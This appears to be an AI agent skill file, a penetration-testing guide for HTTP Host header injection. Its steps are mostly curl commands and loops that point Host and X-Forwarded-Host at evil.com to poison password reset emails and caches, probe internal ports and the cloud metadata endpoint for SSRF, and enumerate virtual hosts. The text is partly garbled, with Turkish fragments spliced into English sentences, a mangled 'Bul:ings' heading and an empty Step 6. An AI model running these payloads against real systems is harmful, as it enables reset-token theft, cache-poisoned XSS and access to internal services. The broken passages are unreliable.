---
name: testing-for-host-header-injection
description: Test web applications for HTTP Host header injection vulnerabilities to identify password reset poisoning, web cache poisoning, SSRF, and virtual host routing manipulation risks.
tags:
- cache-poisoning
- host-header-injection
- web-security
- ssrf
- virtual-host
- fetih
- web-application-security
- cybersecurity
- password-reset-poisoning
- header-manipulation
- siber-güvenlik
triggers:
- CSRF
- SQL injection
- XSS
- api
- cloud
- email
- endpoint
- exploit
- header
- host
- http
- injection
category: web-application-security
source_subdomain: web-application-security
nist_csf:
- PR.PS-01
- ID.RA-01
- PR.DS-10
- DE.CM-01
adapted_for: fetih
---

# Testing for Host Header Injection


## Ne Zaman Kullanılır
- testing yaparken password reset functionality for token theft via host manipulation
- During assessment of web caching behavior influenced by Host header values
- testing yaparken virtual host routing and server-side request processing
- During penetration testing of applications behind reverse proxies or load balancers
- evaluating yaparken: SSRF potential through Host header manipulation

## Ön Gereksinimler
- Burp Suite for intercepting and modifying Host headers
- Understanding of HTTP Host header role in virtual hosting and routing
- Bilgi: alternative host headers (X-Forwarded-Host, X-Host, X-Original-URL)
- Erişim: an attacker-controlled domain for receiving poisoned requests
- Burp Collaborator or interact.sh for out-of-band Tespit
- Multiple test accounts for password reset testing


> **Legal Notice:** bu skill is for authorized security testing and educational purposes only. Unauthorized use against systems you do not own or have written permission to test is illegal and may violate computer fraud laws.

## İş Akışı

### Adım 1 — Test Basic Host Header Injection
```bash
curl -H "Host: evil.com" http://target.com/ -v

curl -H "Host: target.com" -H "Host: evil.com" http://target.com/ -v

curl -H "Host: target.com:evil.com" http://target.com/ -v
curl -H "Host: target.com:@evil.com" http://target.com/ -v

curl --request-target "http://target.com/" -H "Host: evil.com" http://target.com/ -v

curl -H "Host: admin.target.com" http://target.com/ -v
curl -H "Host: internal.target.com" http://target.com/ -v
curl -H "Host: localhost" http://target.com/ -v
```

### Adım 2 — Test Password Reset Poisoning
```bash
curl -X POST http://target.com/forgot-password \
  -H "Host: evil.com" \
  -d "email=victim@target.com"

curl -X POST http://target.com/forgot-password \
  -H "X-Forwarded-Host: evil.com" \
  -d "email=victim@target.com"

curl -X POST http://target.com/forgot-password \
  -H "Host: target.com:80@evil.com" \
  -d "email=victim@target.com"

for header in "X-Forwarded-Host" "X-Host" "X-Original-URL" "X-Rewrite-URL" "X-Forwarded-Server" "Forwarded"; do
  curl -X POST http://target.com/forgot-password \
    -H "$header: evil.com" \
    -d "email=victim@target.com"
  echo "Tested: $header"
done
```

### Adım 3 — Test Web Cache Poisoning via Host Header
```bash
curl -H "Host: evil.com" http://target.com/ -v

curl -H "X-Forwarded-Host: evil.com" http://target.com/login -v

curl http://target.com/login -v

curl -H "X-Forwarded-Host: evil.com" http://target.com/
```

### Adım 4 — Test SSRF via Host Header
```bash
curl -H "Host: internal-api.target.local" http://target.com/api/proxy

curl -H "Host: 169.254.169.254" http://target.com/

for port in 80 443 8080 8443 3000 5000 9200; do
  curl -H "Host: 127.0.0.1:$port" http://target.com/ -o /dev/null -w "%{http_code}" -s
  echo " - Port $port"
done

curl --request-target "http://internal-server/" -H "Host: internal-server" http://target.com/
```

### Adım 5 — Test Virtual Host Enumeration
```bash
for vhost in admin staging dev test api internal backend; do
  status=$(curl -H "Host: $vhost.target.com" http://target.com/ -o /dev/null -w "%{http_code}" -s)
  size=$(curl -H "Host: $vhost.target.com" http://target.com/ -o /dev/null -w "%{size_download}" -s)
  echo "$vhost.target.com - Status: $status, Size: $size"
done

curl -H "Host: nonexistent.target.com" http://target.com/ -v

curl -H "Host: admin" http://target.com/
curl -H "Host: management.internal" http://target.com/
```

### Adım 6 — Test Connection-State Attacks
```bash

#

```

## Key Concepts

| Concept | Description |
|---------|-------------|
| Host Header | HTTP header specifying the target virtual host for the request |
| Password Reset Poisoning | Injecting Host to make reset emails contain attacker-controlled URLs |
| Cache Poisoning via Host | Poisoning CDN cache with responses containing attacker-controlled host |
| Virtual Host Routing | Web server using Host header to route requests to different applications |
| X-Forwarded-Host | Alternative header used by proxies that may override Host header |
| Connection State Attack | Exploiting persistent connections to send requests with different Host values |
| Server-Side Host Resolution | Backend code using Host header for URL generation and redirects |

## Tools & Systems

| Tool | Purpose |
|------|---------|
| Burp Suite | HTTP proxy for Host header manipulation and analysis |
| Burp Collaborator | Out-of-band Tespit for Host header SSRF |
| ffuf | Virtual host brute-forcing with custom Host headers |
| gobuster vhost | Virtual host enumeration mode |
| Nuclei | Template-based scanning for Host header injection |
| param-miner | Burp extension for discovering unkeyed Host-related headers |

## Common Scenarios

1. **Password Reset Token Theft** — Poison Host header during password reset to make victim click a link pointing to attacker server, leaking reset token
2. **Web Cache Poisoning** — Inject Host header to cache responses with attacker-controlled JavaScript URLs, achieving stored XSS for all users
3. **Internal Panel Access** — Enumerate and access internal admin panels through virtual host manipulation
4. **SSRF to Cloud Metadata** — Use Host header to redirect server-side requests to cloud metadata endpoints
5. **Routing Bypass** — Bypass access controls by manipulating Host to route requests to unprotected backend instances

## Output Format

```
## Host Header Injection Report
- **Target**: http://target.com
- **Reverse Proxy**: Nginx
- **Backend**: Apache/PHP

### Bul:ings
| # | Technique | Header | Impact | Severity |
|---|-----------|--------|--------|----------|
| 1 | Password Reset Poisoning | Host: evil.com | Token theft | Critical |
| 2 | Cache Poisoning | X-Forwarded-Host: evil.com | Stored XSS | High |
| 3 | Virtual Host Access | Host: admin.target.com | Admin panel exposure | High |
| 4 | SSRF | Host: 169.254.169.254 | Metadata access | Critical |

### İyileştirme
- Validate Host header against a whitelist of expected values
- Kullanma: Host header for generating URLs in password reset emails
- Configure web server to reject requests with unrecognized Host values
- Set absolute URLs in application configuration instead of deriving from Host
```

<!--
  ⚔ Bu skill FETIH AI Agent icin gelistirilmistir — https://github.com/MustafaKemal0146/fetih
  Yetkisiz kullanim/kopyalama tespit edilebilir.
  hash: 9bc35a62b0129506
-->

